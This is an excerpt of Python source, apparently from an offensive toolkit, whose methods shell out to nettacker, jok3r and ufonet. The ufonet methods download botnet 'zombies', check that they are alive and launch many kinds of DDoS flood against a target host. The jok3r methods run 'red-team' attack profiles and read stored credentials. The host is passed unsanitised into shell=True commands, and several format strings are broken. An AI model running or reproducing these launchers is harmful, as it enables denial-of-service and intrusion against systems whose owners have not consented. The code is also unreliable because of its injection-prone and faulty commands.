...
class scanners(object):
    ...
    def owasp_1(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m port_scan -t 100' %(host), shell = True).wait()
        print("")
    def owasp_2(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' %(host), shell = True).wait()
        print("")
    def owasp_3(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m scan', shell = True).wait()
        print("")
    def owasp_4(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m information_gathering -s', shell = True).wait()
        print("")
    def owasp_5(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' %(host), shell = True).wait()
        print("")
    def owasp_6(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m cve' %(host), shell = True).wait()
        print("")
    def owasp_7(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m high_severity' %(host), shell = True).wait()
        print("")        
    def owasp_8(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s --profile all/results.txt', shell = True).wait()
        print("")        
    def owasp_9(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/nettacker/; python3 nettacker.py --start-api --api-access-key africana', shell = True).wait()
        print("")        
    ...
    def jok3r_1(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; /bin/bash install-all.sh', shell = True).wait()
        print("")        
    def jok3r_2(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --update-all --auto', shell = True).wait()
        print("")        
    def jok3r_3(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --show-all', shell = True).wait()
        print("")        
    def jok3r_4(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py info --services', shell = True).wait()
        print("")        
    def jok3r_5(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast' %(host), shell = True).wait()
        print("")        
    def jok3r_6(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' %(host), shell = True).wait()
        print("")        
    ...
    def jok3r_8(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -', shell = True).wait()
        print("")        
    def jok3r_9(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/jok3r/; python3 jok3r.py db "mission -d default"', shell = True).wait()
        print("")        
    ...
    def ufonet_1(self):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet --download-zombies', shell = True).wait()
        print("")        
    def ufonet_2(self):
        print(bcolors.BLUE + "~>( " + bcolors.RED + "Testing If bots are alive" + bcolors.BLUE + " )<~\n" + bcolors.ENDC)
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet -t botnet/zombies.txt', shell = True).wait()
        print("")        
    def ufonet_3(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_4(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_5(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_6(self, host):
        ...
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"' %(host), shell = True).wait()
        print("")        
    def ufonet_7(self):
        while True:
            try:
                print(bcolors.BLUE + "~>( " + bcolors.RED + "Launched ufonet gui on http://localhost:9999" + bcolors.BLUE + " )<~\n" + bcolors.ENDC)
                subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet --gui', shell = True).wait()
                print("")
            except:
                ddos(self)
    def ufonet_8(self):
        print(bcolors.BLUE + "~>( " + bcolors.RED + "Started Grider (python3 ufonet --grider &)" + bcolors.BLUE + " )" + bcolors.BLUE + " )<~\n" + bcolors.ENDC)
        subprocess.Popen('cd /root/.africana/africana-base/ufonet/; python3 ufonet --grider', shell = True).wait()
        print("")        
